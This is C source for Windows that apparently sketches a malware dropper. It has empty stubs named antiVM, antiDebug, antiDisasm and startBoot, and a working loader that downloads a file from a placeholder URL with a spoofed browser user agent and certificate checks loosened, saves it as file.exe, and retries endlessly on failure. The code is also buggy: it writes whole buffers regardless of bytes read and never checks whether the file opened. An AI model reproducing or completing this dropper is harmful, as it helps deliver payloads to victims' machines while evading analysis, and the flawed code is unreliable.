#include <Windows.h>
#include <Lmcons.h>
#include <wchar.h>
#include <stdio.h>
#include <winreg.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <wininet.h>

#define BUFSIZE MAX_PATH

int antiVM(){}
int antiDebug(){}
int antiDisasm(){}
int startBoot(){}
int checkInternet(){
    
}

int loader(){
    char url[BUFSIZE] = "https://[lien].tld/[any].txt";
    char buff[BUFSIZE];
    DWORD bytesRead;
    HANDLE hdl, hdl2;
    hdl = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hdl != NULL){
        hdl2 = InternetOpenUrlA(hdl, url, 0, 0, INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
        if (hdl2 != NULL){
            FILE * file = fopen("file.exe", "w");
            do {
                BOOL hdl3 = InternetReadFile(hdl2, buff, sizeof(buff), &bytesRead);
                fwrite(buff, sizeof(buff), 1, file);

            } while (bytesRead > 0);
            fclose(file);
        } else loader();
    } else loader();

    InternetCloseHandle(hdl);
	InternetCloseHandle(hdl2);

}

int main(){
    loader();
    return 0;
}
